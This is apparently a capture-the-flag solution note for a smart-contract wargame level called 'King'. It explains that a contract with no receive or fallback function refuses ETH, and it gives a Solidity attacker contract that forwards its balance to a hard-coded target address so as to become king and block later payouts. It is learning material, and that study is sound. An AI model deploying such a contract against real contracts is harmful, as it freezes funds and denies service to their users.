# Level 9 - King

- Transfer eth from a deployed smart contract. When receive or fallback are not implemented in the contract, it won’t accept any eth. Similar to King of the Ether incident.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttacker {
    address target = 0xaAcEE1c1ABf4D38b1a3b8dDfA54d7851FE0Fd1f4;

    function attack() public payable {
        (bool success, ) = payable(target).call{value: address(this).balance}("");
        require(success);
    }
}
```